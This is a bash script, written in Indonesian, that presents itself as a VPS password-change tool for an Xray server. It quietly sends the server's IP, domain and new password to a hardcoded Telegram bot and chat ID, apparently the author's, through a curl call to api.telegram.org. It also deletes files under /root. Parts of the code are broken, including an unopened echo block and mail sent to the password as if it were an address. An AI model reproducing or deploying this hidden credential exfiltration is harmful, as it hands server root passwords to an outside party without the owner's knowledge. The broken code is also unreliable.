#!/bin/bash
# My Telegram : https://t.me/WokszXD
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
clear
pw=$(cat /etc/root/passwd)
if [[ "$pw" = "" ]]; then
echo "Masukkan Password Baru"
read -rp "New Pw : " -e pw
cat <<EOF>>/root/pw
$pw
EOF
fi
clear
echo "Mohon Menunggu , Proses Ganti Password sedang berlangsung !!"
Detail Your Vps Info 
==================================
IP VPS        : $IP
NEW PASS   : $pw
Tanggal       : $date
==================================
" | mail -s "YOUR PASSWORD" $pw
rm -rf /root/passwd
rm -r /root/$IP-$date.zip
clear
CHATID="5716954563"
KEY="6379535129:AAGfTsJgiZwaUZRPz_DiF5HOv7qMJMdRHeY"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail ganti pw VPS</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>IP VPS  :</b> <code>${IP} </code>
<b>DOMAIN :</b> <code>${domain}</code>
<b>Tanggal : $date</b>
<b>NEW PW :$pw</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<code>BY BOT : @WokszXD</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Your Pass 
==================================
IP VPS        : $IP
New Pw   : $pw
Tanggal       : $date
==================================
"
echo "di ingatt pw nya!!!"
echo ""
